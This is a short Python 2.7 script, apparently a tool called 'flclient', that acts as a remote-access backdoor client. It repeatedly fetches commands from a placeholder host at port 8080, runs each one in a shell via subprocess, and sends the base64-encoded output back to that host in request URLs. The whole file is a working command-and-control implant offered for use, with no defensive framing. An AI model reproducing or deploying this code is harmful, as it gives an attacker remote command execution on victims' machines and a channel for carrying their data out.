# Application Banner
def hujambo():
    print('''
##################################################
# Tool    : flclient                             #
# Version : 1.0                                  #
# Coded with Python 2.7                          #
# Source  : https://github.com/pr2h/             #
##################################################
    ''')

import subprocess
import sys
import time
import base64
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def download_and_post(command = ''):
    command = ''
    prev_command = ''
    command_out = ''
    
    while True:
        # Edit the IP below
        command = requests.get('http://<IP>:8080/command').content.lstrip().rstrip()

        if command == '':
            time.sleep(5)
            continue

        if command == prev_command:
            time.sleep(5)
            continue
        
        if command == 'exit':
            # Edit the IP below
            REQUEST_URL = 'http://<IP>:8080/' + base64.b64encode('Exiting..')
            requests.get(REQUEST_URL)
            sys.exit()

        if command=='pause':
            time.sleep(10)
            continue

        else: 
            try:
                command_out=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
                if command_out == '':
                    command_out='Error: Command cannot be executed'
                
            except:
                command_out='Error: Command cannot be executed'

        # Edit the IP below
        REQUEST_URL = 'http://<IP>:8080/' + base64.b64encode(command_out)
        requests.get(REQUEST_URL)
        
        prev_command = command
        time.sleep(5)

if __name__=='__main__':
    hujambo()
    download_and_post('')
